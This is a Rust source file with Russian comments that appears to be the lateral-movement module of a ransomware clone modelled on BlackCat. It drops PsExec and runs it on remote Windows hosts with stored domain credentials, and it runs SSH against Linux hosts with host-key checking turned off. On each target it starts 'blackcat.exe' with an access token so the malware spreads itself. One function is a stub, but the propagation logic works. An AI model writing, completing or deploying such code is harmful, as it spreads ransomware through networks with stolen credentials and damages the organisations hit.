use std::process::Command;
use std::fs;
use std::path::Path;

pub struct LateralMovement {
    config: crate::config::BlackCatConfig,
}

impl LateralMovement {
    pub fn new(config: crate::config::BlackCatConfig) -> Self {
        LateralMovement { config }
    }
    
    /// Извлекает встроенный PsExec из бинарника в %Temp%
    pub fn extract_psexec(&self) -> Result<String, Box<dyn std::error::Error>> {
        println!("[*] Extracting embedded PsExec...");
        
        // PsExec будет встроен через include_bytes! в main.rs
        // Это функция только для demонстрации структуры
        let temp_dir = std::env::temp_dir();
        let psexec_path = temp_dir.join("psexec.exe");
        
        // В реальном коде PsExec был бы встроен через include_bytes!
        // и распакован здесь
        
        println!("[+] PsExec extracted to: {:?}", psexec_path);
        Ok(psexec_path.to_string_lossy().to_string())
    }
    
    /// Выполняет PsExec для lateral movement
    pub fn execute_psexec_lateral_movement(
        &self,
        target_hosts: &[String],
        command: &str,
    ) -> Result<(), Box<dyn std::error::Error>> {
        if !self.config.windows_options.enable_psexec_propagation {
            return Ok(());
        }
        
        println!("[*] Executing PsExec lateral movement...");
        
        let psexec_path = self.extract_psexec()?;
        
        // Выбираем первый набор credentials
        if let Some((_, cred_set)) = self.config.credentials.iter().next() {
            println!("[*] Using credentials: {}", cred_set.username);
            
            for target in target_hosts {
                println!("[*] Targeting: {}", target);
                
                // Формируем команду PsExec
                let mut args = vec![
                    "/accepteula".to_string(),
                    format!("\\\\{}", target),
                    "-u".to_string(),
                    if let Some(domain) = &cred_set.domain {
                        format!("{}\\{}", domain, cred_set.username)
                    } else {
                        cred_set.username.clone()
                    },
                    "-p".to_string(),
                    cred_set.password.clone(),
                    "-d".to_string(),
                    "-n".to_string(),
                    "5".to_string(),
                    "cmd".to_string(),
                    "/c".to_string(),
                    command.to_string(),
                ];
                
                // Выполняем PsExec
                let _output = Command::new(&psexec_path)
                    .args(&args)
                    .output();
            }
        }
        
        println!("[+] PsExec lateral movement completed");
        Ok(())
    }
    
    /// Выполняет SSH lateral movement в Linux окружении
    pub fn execute_ssh_lateral_movement(
        &self,
        target_hosts: &[String],
        command: &str,
    ) -> Result<(), Box<dyn std::error::Error>> {
        if !self.config.linux_options.enable_lateral_movement {
            return Ok(());
        }
        
        println!("[*] Executing SSH lateral movement...");
        
        for target in target_hosts {
            println!("[*] Connecting to: {}", target);
            
            // Используем key-based authentication если доступна
            let output = Command::new("ssh")
                .args(&[
                    "-o", "BatchMode=yes",
                    "-o", "StrictHostKeyChecking=no",
                    "-o", "ConnectTimeout=5",
                    target,
                    command,
                ])
                .output();
            
            match output {
                Ok(output) => {
                    if output.status.success() {
                        println!("[+] Command executed on {}", target);
                    }
                }
                Err(e) => {
                    println!("[!] SSH connection failed to {}: {}", target, e);
                }
            }
        }
        
        println!("[+] SSH lateral movement completed");
        Ok(())
    }
    
    /// Основная функция для lateral movement
    pub async fn execute(
        &self,
        windows_targets: &[String],
        linux_targets: &[String],
    ) -> Result<(), Box<dyn std::error::Error>> {
        println!("[*] Starting lateral movement operations...");
        
        // Формируем команду распространения
        let propagation_cmd = format!(
            "blackcat.exe --access-token {} --propagated",
            self.config.access_token
        );
        
        // PsExec на Windows
        if !windows_targets.is_empty() {
            self.execute_psexec_lateral_movement(windows_targets, &propagation_cmd)?;
        }
        
        // SSH на Linux
        if !linux_targets.is_empty() {
            self.execute_ssh_lateral_movement(linux_targets, &propagation_cmd)?;
        }
        
        println!("[+] Lateral movement completed");
        Ok(())
    }
}
